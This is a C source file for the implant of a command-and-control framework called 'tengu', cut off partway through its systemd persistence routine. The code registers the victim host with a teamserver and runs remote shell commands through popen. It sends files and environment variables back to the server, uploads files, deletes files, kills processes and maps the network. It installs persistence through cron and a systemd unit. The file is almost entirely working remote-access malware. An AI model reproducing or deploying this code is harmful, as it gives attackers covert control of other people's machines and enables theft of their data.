#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <ftw.h>
#include <pwd.h>
#include <grp.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

#include "tengu.h"

// Helpers to build outgoing packets (header + payload, sent to server in BE).

// Build the 12-byte BE header: [Size][MagicValue][AgentID]
static void push_header(Buf* b, uint32_t payload_size) {
    buf_push_u32be(b, 12 + payload_size);  // total size includes header itself
    buf_push_u32be(b, TENGU_MAGIC_VALUE);
    buf_push_u32be(b, g_agent_id);
}

// Packet for INIT registration.
// After the header: [DEMON_INIT:4B BE][RequestID=0:4B BE][fields...]
Buf* build_init_packet(void) {
    // Gather sysinfo.
    char hostname[256] = "unknown";
    char username[256] = "unknown";
    char internalip[64] = "127.0.0.1";
    char osinfo[64]    = "Linux";

    gethostname(hostname, sizeof(hostname)-1);

    getlogin_r(username, sizeof(username)-1);

    // Build the body first to know its size.
    Buf* body = buf_new();
    buf_push_u32be(body, DEMON_INIT);
    buf_push_u32be(body, 0);  // RequestID = 0

    buf_push_str_be(body, hostname);
    buf_push_str_be(body, username);
    buf_push_str_be(body, internalip);
    buf_push_str_be(body, osinfo);
    buf_push_str_be(body, "tengu");    // process name

    buf_push_u32be(body, (uint32_t)getpid());
    buf_push_u32be(body, (uint32_t)g_config.sleep_delay);
    buf_push_u32be(body, (uint32_t)g_config.sleep_jitter);

    // Append the 32-byte ChaCha20 session key (raw, no length prefix).
    // The teamserver reads this after the fixed init fields and stores it per-agent.
    buf_push_bytes(body, g_chacha_key, 32);

    Buf* pkt = buf_new();
    push_header(pkt, (uint32_t)body->size);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);
    return pkt;
}

// Packet to poll for jobs: [Size][Magic][ID][COMMAND_GET_JOB:4B BE][0:4B BE]
Buf* build_checkin_packet(void) {
    Buf* body = buf_new();
    buf_push_u32be(body, COMMAND_GET_JOB);
    buf_push_u32be(body, 0);  // RequestID

    Buf* pkt = buf_new();
    push_header(pkt, (uint32_t)body->size);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);
    return pkt;
}

// Generic output packet. cmd = COMMAND_OUTPUT or COMMAND_ERROR.
Buf* build_output_packet(uint32_t req_id, uint32_t cmd, const char* output) {
    size_t olen = output ? strlen(output) : 0;

    Buf* body = buf_new();
    buf_push_u32be(body, cmd);
    buf_push_u32be(body, req_id);
    buf_push_u32be(body, (uint32_t)(4 + olen));  // data size = len_prefix + str
    buf_push_u32be(body, (uint32_t)olen);
    if (olen > 0)
        buf_push_bytes(body, (const uint8_t*)output, olen);

    Buf* pkt = buf_new();
    push_header(pkt, (uint32_t)body->size);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);
    return pkt;
}

// Download result packet: [cmd][req_id][data_size][name_len][name][file_len][file]
static Buf* build_file_result(uint32_t cmd_id, uint32_t req_id, const char* path, const uint8_t* data, size_t flen) {
    size_t nlen = path ? strlen(path) : 0;
    uint32_t data_size = 4 + (uint32_t)nlen + 4 + (uint32_t)flen;

    Buf* body = buf_new();
    buf_push_u32be(body, cmd_id);
    buf_push_u32be(body, req_id);
    buf_push_u32be(body, data_size);
    buf_push_u32be(body, (uint32_t)nlen);
    if (nlen > 0) buf_push_bytes(body, (const uint8_t*)path, nlen);
    buf_push_u32be(body, (uint32_t)flen);
    if (flen > 0) buf_push_bytes(body, data, flen);

    Buf* pkt = buf_new();
    push_header(pkt, (uint32_t)body->size);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);
    return pkt;
}

Buf* build_download_result(uint32_t req_id, const char* path, const uint8_t* data, size_t flen) {
    return build_file_result(TENGU_DOWNLOAD, req_id, path, data, flen);
}

static Buf* build_screenshot_result(uint32_t req_id, const char* path, const uint8_t* data, size_t flen) {
    return build_file_result(TENGU_SCREENSHOT, req_id, path, data, flen);
}

// --- Command implementations ---

void cmd_shell(uint32_t req_id, const char* cmdstr) {
    FILE* fp = popen(cmdstr, "r");
    if (!fp) {
        // report error
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "popen failed");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    // Read all output.
    char* out = NULL;
    size_t out_len = 0;
    char tmp[4096];
    while (fgets(tmp, sizeof(tmp), fp)) {
        size_t l = strlen(tmp);
        out = realloc(out, out_len + l + 1);
        memcpy(out + out_len, tmp, l);
        out_len += l;
        out[out_len] = '\0';
    }
    pclose(fp);

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(out);
}

void cmd_pwd(uint32_t req_id) {
    char buf[4096];
    const char* cwd = getcwd(buf, sizeof(buf));
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, cwd ? cwd : "unknown");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_ls(uint32_t req_id, const char* path) {
    cmd_ls_json(req_id, path);
}

static char* json_escape(const char* s) {
    size_t len = 0;
    for (const char* p = s; *p; p++) {
        len += (*p == '"' || *p == '\\' || *p == '\n' || *p == '\r' || *p == '\t') ? 2 : 1;
    }
    char* out = malloc(len + 1);
    if (!out) return NULL;
    char* d = out;
    for (const char* p = s; *p; p++) {
        switch (*p) {
            case '"':  *d++ = '\\'; *d++ = '"';  break;
            case '\\': *d++ = '\\'; *d++ = '\\'; break;
            case '\n': *d++ = '\\'; *d++ = 'n';  break;
            case '\r': *d++ = '\\'; *d++ = 'r';  break;
            case '\t': *d++ = '\\'; *d++ = 't';  break;
            default:   *d++ = *p;
        }
    }
    *d = '\0';
    return out;
}

void cmd_ls_json(uint32_t req_id, const char* path) {
    char abs_path[4096];
    if (!realpath(path, abs_path)) {
        strncpy(abs_path, path, sizeof(abs_path) - 1);
        abs_path[sizeof(abs_path) - 1] = '\0';
    }

    DIR* dir = opendir(abs_path);
    if (!dir) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to open directory");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    size_t json_cap = 8192;
    size_t json_len = 0;
    char* json = malloc(json_cap);
    if (!json) { closedir(dir); return; }

    char* epath = json_escape(abs_path);
    json_len = (size_t)snprintf(json, json_cap, "{\"Path\":\"%s\",\"Files\":[", epath ? epath : abs_path);
    free(epath);

    struct dirent* entry;
    int first = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char epath2[4352];
        snprintf(epath2, sizeof(epath2), "%s/%s", abs_path, entry->d_name);

        struct stat st;
        if (stat(epath2, &st) != 0) continue;

        const char* type = S_ISDIR(st.st_mode) ? "dir" : "file";
        long long   size = (long long)st.st_size;

        struct tm* tm_info = localtime(&st.st_mtime);
        char tbuf[32];
        strftime(tbuf, sizeof(tbuf), "%Y-%m-%d %H:%M:%S", tm_info);

        /* permissions string: e.g. drwxr-xr-x */
        char perms[11];
        perms[0]  = S_ISDIR(st.st_mode)  ? 'd' : (S_ISLNK(st.st_mode) ? 'l' : '-');
        perms[1]  = (st.st_mode & S_IRUSR) ? 'r' : '-';
        perms[2]  = (st.st_mode & S_IWUSR) ? 'w' : '-';
        perms[3]  = (st.st_mode & S_IXUSR) ? 'x' : '-';
        perms[4]  = (st.st_mode & S_IRGRP) ? 'r' : '-';
        perms[5]  = (st.st_mode & S_IWGRP) ? 'w' : '-';
        perms[6]  = (st.st_mode & S_IXGRP) ? 'x' : '-';
        perms[7]  = (st.st_mode & S_IROTH) ? 'r' : '-';
        perms[8]  = (st.st_mode & S_IWOTH) ? 'w' : '-';
        perms[9]  = (st.st_mode & S_IXOTH) ? 'x' : '-';
        perms[10] = '\0';

        char* ename = json_escape(entry->d_name);
        char entry_buf[768];
        int elen = snprintf(entry_buf, sizeof(entry_buf),
            "%s{\"Type\":\"%s\",\"Name\":\"%s\",\"Size\":\"%lld\",\"Modified\":\"%s\",\"Permissions\":\"%s\"}",
            first ? "" : ",", type, ename ? ename : entry->d_name, size, tbuf, perms);
        free(ename);
        if (first) first = 0;

        while (json_len + (size_t)elen + 4 > json_cap) {
            json_cap *= 2;
            char* tmp = realloc(json, json_cap);
            if (!tmp) { free(json); closedir(dir); return; }
            json = tmp;
        }
        memcpy(json + json_len, entry_buf, (size_t)elen);
        json_len += (size_t)elen;
    }
    closedir(dir);

    if (json_len + 3 > json_cap) {
        char* tmp = realloc(json, json_cap + 4);
        if (!tmp) { free(json); return; }
        json = tmp;
    }
    json[json_len++] = ']';
    json[json_len++] = '}';
    json[json_len]   = '\0';

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, json);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(json);
}

void cmd_ps_json(uint32_t req_id) {
    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to open /proc");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    size_t cap = 16384;
    size_t len = 0;
    char*  json = malloc(cap);
    if (!json) { closedir(proc_dir); return; }

    json[len++] = '[';
    int first = 1;

    struct dirent* ent;
    while ((ent = readdir(proc_dir)) != NULL) {
        // Only numeric entries (PIDs)
        const char* p = ent->d_name;
        if (!*p) continue;
        for (; *p; p++) { if (*p < '0' || *p > '9') goto next_entry; }

        {
            char status_path[64];
            snprintf(status_path, sizeof(status_path), "/proc/%s/status", ent->d_name);
            FILE* f = fopen(status_path, "r");
            if (!f) goto next_entry;

            char name[256]    = "";
            char ppid[32]     = "0";
            char threads[32]  = "1";
            char uid_str[32]  = "0";
            char line[512];

            while (fgets(line, sizeof(line), f)) {
                if      (strncmp(line, "Name:\t",    6) == 0) sscanf(line + 6,  "%255[^\n]", name);
                else if (strncmp(line, "PPid:\t",    6) == 0) sscanf(line + 6,  "%31s",      ppid);
                else if (strncmp(line, "Threads:\t", 9) == 0) sscanf(line + 9,  "%31s",      threads);
                else if (strncmp(line, "Uid:\t",     5) == 0) sscanf(line + 5,  "%31s",      uid_str);
            }
            fclose(f);

            struct passwd* pw = getpwuid((uid_t)atoi(uid_str));
            const char* username = pw ? pw->pw_name : uid_str;

            char exe_path[512] = "";
            char exe_link[64];
            snprintf(exe_link, sizeof(exe_link), "/proc/%s/exe", ent->d_name);
            ssize_t rlen = readlink(exe_link, exe_path, sizeof(exe_path) - 1);
            if (rlen > 0) exe_path[rlen] = '\0';
            else exe_path[0] = '\0';

            char* ename    = json_escape(name);
            char* euser    = json_escape(username);
            char* eexe     = json_escape(exe_path);

            char entry_buf[1024];
            int elen = snprintf(entry_buf, sizeof(entry_buf),
                "%s{\"Name\":\"%s\",\"ImagePath\":\"%s\",\"PID\":\"%s\","
                "\"PPID\":\"%s\",\"Session\":\"0\",\"IsWow\":0,"
                "\"Threads\":\"%s\",\"User\":\"%s\"}",
                first ? "" : ",",
                ename  ? ename  : name,
                eexe   ? eexe   : exe_path,
                ent->d_name, ppid, threads,
                euser  ? euser  : username);

            free(ename); free(euser); free(eexe);

            while (len + (size_t)elen + 4 > cap) {
                cap *= 2;
                char* tmp = realloc(json, cap);
                if (!tmp) { free(json); closedir(proc_dir); return; }
                json = tmp;
            }
            memcpy(json + len, entry_buf, (size_t)elen);
            len += (size_t)elen;
            first = 0;
        }
next_entry:;
    }
    closedir(proc_dir);

    if (len + 2 > cap) {
        char* tmp = realloc(json, cap + 4);
        if (!tmp) { free(json); return; }
        json = tmp;
    }
    json[len++] = ']';
    json[len]   = '\0';

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, json);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(json);
}

void cmd_cd(uint32_t req_id, const char* path) {
    int r = chdir(path);
    const char* msg = (r == 0) ? "ok" : "chdir failed";
    uint32_t    cmd = (r == 0) ? COMMAND_OUTPUT : COMMAND_ERROR;
    Buf* pkt = build_output_packet(req_id, cmd, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_download(uint32_t req_id, const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to open file");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }

    fseek(f, 0, SEEK_END);
    long flen = ftell(f);
    rewind(f);

    uint8_t* data = malloc(flen);
    if (!data || fread(data, 1, flen, f) != (size_t)flen) {
        free(data);
        fclose(f);
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "failed to read file");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    fclose(f);

    Buf* pkt = build_download_result(req_id, path, data, (size_t)flen);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(data);
}

void cmd_upload(uint32_t req_id, const char* remote_path, const uint8_t* data, size_t data_len) {
    FILE* f = fopen(remote_path, "wb");
    if (!f) {
        char err[256];
        snprintf(err, sizeof(err), "failed to open '%s': %s", remote_path, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    size_t written = fwrite(data, 1, data_len, f);
    fclose(f);
    char msg[256];
    if (written != data_len) {
        snprintf(msg, sizeof(msg), "partial write: %zu/%zu bytes to '%s'", written, data_len, remote_path);
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, msg);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    snprintf(msg, sizeof(msg), "uploaded %zu bytes -> %s", data_len, remote_path);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_cat(uint32_t req_id, const char* path) {
    FILE* f = fopen(path, "r");
    if (!f) {
        char err[256];
        snprintf(err, sizeof(err), "failed to open '%s': %s", path, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char* out = NULL;
    size_t out_len = 0;
    char tmp[4096];
    while (fgets(tmp, sizeof(tmp), f)) {
        size_t l = strlen(tmp);
        out = realloc(out, out_len + l + 1);
        memcpy(out + out_len, tmp, l);
        out_len += l;
        out[out_len] = '\0';
    }
    fclose(f);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(out);
}

static int mkdir_p(const char* path, mode_t mode) {
    char tmp[4096];
    strncpy(tmp, path, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    size_t len = strlen(tmp);
    if (len > 0 && tmp[len - 1] == '/')
        tmp[--len] = '\0';
    for (char* p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            if (mkdir(tmp, mode) < 0 && errno != EEXIST) return -1;
            *p = '/';
        }
    }
    return (mkdir(tmp, mode) < 0 && errno != EEXIST) ? -1 : 0;
}

void cmd_mkdir(uint32_t req_id, const char* path) {
    if (mkdir_p(path, 0755) < 0) {
        char err[256];
        snprintf(err, sizeof(err), "mkdir '%s' failed: %s", path, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char msg[256];
    snprintf(msg, sizeof(msg), "created: %s", path);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

static int rm_nftw_cb(const char* fpath, const struct stat* st, int typeflag, struct FTW* ftwbuf) {
    (void)st; (void)ftwbuf;
    return (typeflag == FTW_DP) ? rmdir(fpath) : unlink(fpath);
}

void cmd_rm(uint32_t req_id, const char* path, int recursive) {
    int r;
    if (recursive) {
        r = nftw(path, rm_nftw_cb, 64, FTW_DEPTH | FTW_PHYS);
    } else {
        r = unlink(path);
        if (r < 0 && errno == EISDIR)
            r = rmdir(path);
    }
    char errbuf[256];
    const char* msg = "removed";
    uint32_t cmd = COMMAND_OUTPUT;
    if (r < 0) {
        snprintf(errbuf, sizeof(errbuf), "rm '%s' failed: %s", path, strerror(errno));
        msg = errbuf;
        cmd = COMMAND_ERROR;
    }
    Buf* pkt = build_output_packet(req_id, cmd, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_ps(uint32_t req_id) {
    cmd_ps_json(req_id);
}

void cmd_id(uint32_t req_id) {
    uid_t uid  = getuid();
    uid_t euid = geteuid();
    gid_t gid  = getgid();
    gid_t egid = getegid();

    struct passwd* pw = getpwuid(uid);
    struct group*  gr = getgrgid(gid);

    char buf[4096];
    int  off = 0;
    off += snprintf(buf + off, sizeof(buf) - off,
                    "uid=%u(%s) gid=%u(%s)",
                    uid, pw ? pw->pw_name : "?",
                    gid, gr ? gr->gr_name : "?");
    if (uid != euid) {
        struct passwd* epw = getpwuid(euid);
        off += snprintf(buf + off, sizeof(buf) - off,
                        " euid=%u(%s)", euid, epw ? epw->pw_name : "?");
    }
    if (gid != egid) {
        struct group* egr = getgrgid(egid);
        off += snprintf(buf + off, sizeof(buf) - off,
                        " egid=%u(%s)", egid, egr ? egr->gr_name : "?");
    }
    int ngroups = getgroups(0, NULL);
    if (ngroups > 0) {
        gid_t* groups = malloc((size_t)ngroups * sizeof(gid_t));
        if (groups) {
            getgroups(ngroups, groups);
            off += snprintf(buf + off, sizeof(buf) - off, " groups=");
            for (int i = 0; i < ngroups && off < (int)sizeof(buf) - 32; i++) {
                struct group* g = getgrgid(groups[i]);
                if (i > 0) buf[off++] = ',';
                off += snprintf(buf + off, sizeof(buf) - off,
                                "%u(%s)", groups[i], g ? g->gr_name : "?");
            }
            free(groups);
        }
    }
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, buf);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_env(uint32_t req_id) {
    extern char** environ;
    char* out = NULL;
    size_t out_len = 0;
    if (environ) {
        for (int i = 0; environ[i]; i++) {
            size_t l = strlen(environ[i]);
            out = realloc(out, out_len + l + 2);
            memcpy(out + out_len, environ[i], l);
            out_len += l;
            out[out_len++] = '\n';
            out[out_len]   = '\0';
        }
    }
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(out);
}

void cmd_ifconfig(uint32_t req_id) {
    struct ifaddrs* ifaddr;
    if (getifaddrs(&ifaddr) < 0) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "getifaddrs failed");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char* out = NULL;
    size_t out_len = 0;
    const char* cur_if = NULL;

    for (struct ifaddrs* ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        int family = ifa->ifa_addr->sa_family;
        if (family != AF_INET && family != AF_INET6) continue;

        if (!cur_if || strcmp(cur_if, ifa->ifa_name) != 0) {
            cur_if = ifa->ifa_name;
            char hdr[128];
            int hlen = snprintf(hdr, sizeof(hdr), "%s:\n", ifa->ifa_name);
            out = realloc(out, out_len + hlen + 1);
            memcpy(out + out_len, hdr, hlen);
            out_len += hlen;
            out[out_len] = '\0';
        }

        char addr_str[INET6_ADDRSTRLEN] = "";
        char entry[512];
        int elen = 0;

        if (family == AF_INET) {
            struct sockaddr_in* sa4 = (struct sockaddr_in*)ifa->ifa_addr;
            inet_ntop(AF_INET, &sa4->sin_addr, addr_str, sizeof(addr_str));
            char mask_str[INET_ADDRSTRLEN] = "";
            if (ifa->ifa_netmask) {
                struct sockaddr_in* nm = (struct sockaddr_in*)ifa->ifa_netmask;
                inet_ntop(AF_INET, &nm->sin_addr, mask_str, sizeof(mask_str));
            }
            elen = snprintf(entry, sizeof(entry), "  inet %s  netmask %s\n", addr_str, mask_str);
        } else {
            struct sockaddr_in6* sa6 = (struct sockaddr_in6*)ifa->ifa_addr;
            inet_ntop(AF_INET6, &sa6->sin6_addr, addr_str, sizeof(addr_str));
            elen = snprintf(entry, sizeof(entry), "  inet6 %s\n", addr_str);
        }
        if (elen > 0) {
            out = realloc(out, out_len + elen + 1);
            memcpy(out + out_len, entry, elen);
            out_len += elen;
            out[out_len] = '\0';
        }
    }
    freeifaddrs(ifaddr);

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out ? out : "");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
    free(out);
}

void cmd_chmod(uint32_t req_id, const char* path, uint32_t mode) {
    if (chmod(path, (mode_t)mode) < 0) {
        char err[256];
        snprintf(err, sizeof(err), "chmod '%s' failed: %s", path, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char msg[256];
    snprintf(msg, sizeof(msg), "chmod %04o %s: ok", mode, path);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_cp(uint32_t req_id, const char* src, const char* dst) {
    FILE* fsrc = fopen(src, "rb");
    if (!fsrc) {
        char err[256];
        snprintf(err, sizeof(err), "failed to open src '%s': %s", src, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    FILE* fdst = fopen(dst, "wb");
    if (!fdst) {
        fclose(fsrc);
        char err[256];
        snprintf(err, sizeof(err), "failed to open dst '%s': %s", dst, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    size_t total = 0;
    uint8_t tmp[65536];
    size_t n;
    while ((n = fread(tmp, 1, sizeof(tmp), fsrc)) > 0) {
        fwrite(tmp, 1, n, fdst);
        total += n;
    }
    fclose(fsrc);
    fclose(fdst);
    char msg[256];
    snprintf(msg, sizeof(msg), "copied %zu bytes: %s -> %s", total, src, dst);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_kill(uint32_t req_id, uint32_t pid) {
    if (kill((pid_t)pid, SIGKILL) < 0) {
        char err[256];
        snprintf(err, sizeof(err), "kill %u failed: %s", pid, strerror(errno));
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char msg[64];
    snprintf(msg, sizeof(msg), "killed PID %u", pid);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_sleep(uint32_t req_id, int delay, int jitter) {
    g_config.sleep_delay  = delay;
    g_config.sleep_jitter = jitter;
    // Acknowledge with an output message.
    char msg[64];
    snprintf(msg, sizeof(msg), "sleep set to %ds jitter %d%%", delay, jitter);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_exit(uint32_t req_id) {
    Buf* pkt = build_output_packet(req_id, COMMAND_EXIT, "exit");
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── netstat ───────────────────────────────────────────────────────────────────

void cmd_netstat(uint32_t req_id) {
    // Read /proc/net/tcp and /proc/net/tcp6 for TCP connections.
    static const char* state_names[] = {
        "UNKNOWN","ESTABLISHED","SYN_SENT","SYN_RECV","FIN_WAIT1",
        "FIN_WAIT2","TIME_WAIT","CLOSE","CLOSE_WAIT","LAST_ACK",
        "LISTEN","CLOSING","NEW_SYN_RECV"
    };

    char out[8192];
    int  pos = 0;
    pos += snprintf(out + pos, sizeof(out) - pos,
        "Proto  Local Address           Foreign Address         State\n");

    const char* files[] = { "/proc/net/tcp", "/proc/net/tcp6", NULL };
    for (int fi = 0; files[fi]; fi++) {
        FILE* f = fopen(files[fi], "r");
        if (!f) continue;
        char line[512];
        fgets(line, sizeof(line), f); // skip header
        while (fgets(line, sizeof(line), f) && pos < (int)sizeof(out) - 128) {
            unsigned slot, state, inode;
            unsigned long local_addr, rem_addr;
            unsigned local_port, rem_port;
            if (sscanf(line, " %u: %lX:%X %lX:%X %X %*s %*s %*s %*s %*s %u",
                    &slot, &local_addr, &local_port,
                    &rem_addr, &rem_port, &state, &inode) < 6) continue;

            char laddr[48], raddr[48];
            if (fi == 0) { // IPv4
                struct in_addr la = { .s_addr = (uint32_t)local_addr };
                struct in_addr ra = { .s_addr = (uint32_t)rem_addr };
                snprintf(laddr, sizeof(laddr), "%s:%u", inet_ntoa(la), local_port);
                snprintf(raddr, sizeof(raddr), "%s:%u", inet_ntoa(ra), rem_port);
            } else { // IPv6 (show raw hex for simplicity)
                snprintf(laddr, sizeof(laddr), "[ipv6]:%u", local_port);
                snprintf(raddr, sizeof(raddr), "[ipv6]:%u", rem_port);
            }
            const char* sname = (state < 13) ? state_names[state] : "UNKNOWN";
            pos += snprintf(out + pos, sizeof(out) - pos,
                "%-6s %-23s %-23s %s\n",
                (fi == 0) ? "tcp" : "tcp6", laddr, raddr, sname);
        }
        fclose(f);
    }
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── arp ───────────────────────────────────────────────────────────────────────

void cmd_arp(uint32_t req_id) {
    FILE* f = fopen("/proc/net/arp", "r");
    if (!f) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "cannot open /proc/net/arp");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char out[4096];
    int  pos = 0;
    char line[256];
    while (fgets(line, sizeof(line), f) && pos < (int)sizeof(out) - 10)
        pos += snprintf(out + pos, sizeof(out) - pos, "%s", line);
    fclose(f);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── route ─────────────────────────────────────────────────────────────────────

void cmd_route(uint32_t req_id) {
    FILE* f = fopen("/proc/net/route", "r");
    if (!f) {
        Buf* pkt = build_output_packet(req_id, COMMAND_ERROR, "cannot open /proc/net/route");
        g_c2_post(pkt->data, pkt->size, NULL, NULL);
        buf_free(pkt);
        return;
    }
    char out[4096];
    int  pos = 0;
    pos += snprintf(out + pos, sizeof(out) - pos,
        "%-10s %-16s %-16s %-10s %-8s\n",
        "Iface", "Destination", "Gateway", "Flags", "Metric");
    char iface[16];
    unsigned dest, gw, flags, mask;
    int metric, refcnt, use, window, irtt;
    char line[256];
    fgets(line, sizeof(line), f); // skip header
    while (fgets(line, sizeof(line), f) && pos < (int)sizeof(out) - 80) {
        if (sscanf(line, "%s %X %X %X %d %d %d %X %d %d %d",
                iface, &dest, &gw, &flags, &refcnt, &use,
                &metric, &mask, &window, &irtt, &irtt) < 8) continue;
        struct in_addr da = { .s_addr = dest };
        struct in_addr ga = { .s_addr = gw };
        pos += snprintf(out + pos, sizeof(out) - pos,
            "%-10s %-16s %-16s 0x%-8X %-8d\n",
            iface, inet_ntoa(da), inet_ntoa(ga), flags, metric);
    }
    fclose(f);
    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// ── persistence ───────────────────────────────────────────────────────────────

void cmd_persist_cron(uint32_t req_id, const char* payload_path, const char* interval) {
    // interval: cron expression, e.g. "*/5 * * * *"
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "(crontab -l 2>/dev/null; echo '%s %s') | crontab -",
        interval, payload_path);
    int rc = system(cmd);
    char msg[256];
    if (rc == 0)
        snprintf(msg, sizeof(msg), "[+] cron persistence added: %s %s", interval, payload_path);
    else
        snprintf(msg, sizeof(msg), "[-] crontab failed (exit %d)", rc);
    Buf* pkt = build_output_packet(req_id, rc == 0 ? COMMAND_OUTPUT : COMMAND_ERROR, msg);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

void cmd_persist_systemd(uint32_t req_id, const char* payload_path) {
    const char* unit_path = "/etc/systemd/system/mugen-agent.service";
    // Try user dir if /etc is not writable
    char user_unit[256];
    snprintf(user_unit, sizeof(user_unit), "%s/.config/systemd/user/mugen-agent.service",
             getenv("HOME") ? getenv("HOME") : "/root");

    char unit_content[512];
    snprintf(unit_content, sizeof(unit_content),
        "[Unit]\nDescription=Mugen Agent\nAfter=network.target\n\n"
        "[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n"
        "[Install]\nWantedBy=multi-user.target\n",
        payload_path);

    // Try system path first, fall back to user path
    FILE* f = fopen(unit_path, "w");
    const char* used_path = unit_path;
    if (!f) {
        // ensure user systemd dir exists
        char dir[256];
